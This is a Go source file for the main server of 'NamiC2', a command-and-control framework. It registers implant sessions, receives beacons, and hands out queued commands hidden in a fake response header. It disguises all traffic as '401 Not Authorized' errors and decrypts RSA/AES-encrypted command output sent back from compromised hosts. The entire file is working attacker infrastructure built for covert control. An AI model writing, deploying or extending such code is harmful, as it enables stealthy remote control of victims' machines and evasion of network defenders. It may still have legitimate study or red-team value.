package main

import (
	"crypto/rsa"
	"crypto/x509"
	"encoding/base64"
	"encoding/pem"
	"errors"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"NamiDatabase"
	"NamiPrompt"
	"NamiUtilities"
	"NamiWorker"
	_ "embed"

	"github.com/gorilla/mux"
)

var privKey *rsa.PrivateKey

func InitSession(w http.ResponseWriter, r *http.Request) {
	initialInfo := r.Header.Get("Location")
	initialDecoded, _ := base64.StdEncoding.DecodeString(initialInfo)
	headerInfo := strings.Split(string(initialDecoded), "||")
	fmt.Println("\n[*] New Session ID: ", headerInfo[1])
	NamiDatabase.AddToDatabase(headerInfo[1], headerInfo[2], headerInfo[3], headerInfo[0])
}

func CommandResults(w http.ResponseWriter, r *http.Request) {
	defer NamiWorker.WG.Done()
	requestBody, _ := io.ReadAll(r.Body)
	authHeader := r.Header.Get("Authorization")
	encryptedKey := strings.TrimLeft(authHeader, "Basic ")
	decryptedAESKey := NamiUtilities.DecryptOAEP(encryptedKey, *privKey)
	decryptedResults := NamiUtilities.DecryptAES(decryptedAESKey, string(requestBody))
	fmt.Println(string(decryptedResults))
	http.Error(w, "Not Authorized", http.StatusUnauthorized)
}

func ReceiveBeacon(w http.ResponseWriter, r *http.Request) {
	uuid := r.Header.Get("Location")
	NamiDatabase.UpdateCheckInTime(uuid)
	results := NamiWorker.ProcessJob(uuid)
	if results != "" {
		w.Header().Add("Origin-Isolation", results)
		http.Error(w, "Not Authorized", http.StatusUnauthorized)
	}
}

func main() {
	// Flag information for NamiC2 initialization
	ipAddress := flag.String("ip", "0.0.0.0", "IP address for NamiC2 to listen on")
	port := flag.Int("port", 443, "Port for NamiC2 to listen on")
	flag.Usage = func() {
		fmt.Println("\nUsage of NamiC2:\n")
		flag.PrintDefaults()
	}
	flag.Parse()
	formattedListener := fmt.Sprintf("%s:%d", *ipAddress, *port)

	// Check for RSA keys for encryption; create if does not exist
	if _, err := os.Stat(filepath.FromSlash("_keys/private.pem")); errors.Is(err, os.ErrNotExist) {
		NamiUtilities.GenerateRSAKeys()
	}
	privKeyFile, _ := os.ReadFile(filepath.FromSlash("_keys/private.pem"))
	block, _ := pem.Decode([]byte(privKeyFile))
	privKey, _ = x509.ParsePKCS1PrivateKey(block.Bytes)

	// Check for database file; create if does not exist
	if _, err := os.Stat(filepath.FromSlash("db/Nami.db")); errors.Is(err, os.ErrNotExist) {
		NamiDatabase.CreateInitialDatabase()
	}

	// Clean up the database of stale sessions
	NamiDatabase.CleanUpDatabase()

	// Need to clear out argument list (if any) before sending to Grumble; otherwise, Grumble will complain about invalid flag
	// TODO: Probably a better way to do this
	os.Args = nil

	// Create Grumble prompt
	finished := make(chan bool)
	go NamiPrompt.CreatePrompt(finished, *ipAddress, *port)

	// Set up and listen for incoming C2 connections via HTTP
	router := mux.NewRouter()
	router.HandleFunc("/{rpath:f.*}", InitSession).Methods(http.MethodGet)
	router.HandleFunc("/{rpath:c.*}", ReceiveBeacon).Methods(http.MethodGet)
	router.HandleFunc("/{rpath:r.*}", CommandResults).Methods(http.MethodPost)
	srv := &http.Server{
		Handler:      router,
		Addr:         formattedListener,
		WriteTimeout: 15 * time.Second,
		ReadTimeout:  15 * time.Second,
	}

	// Start the HTTP server; error out if there is an issue (usually choosing a port that is already in use)
	go func() {
		if err := srv.ListenAndServe(); err != http.ErrServerClosed {
			fmt.Println(err.Error())
			finished <- true
		}
	}()

	// Clean up program for exit
	<-finished
	os.Exit(0)
}
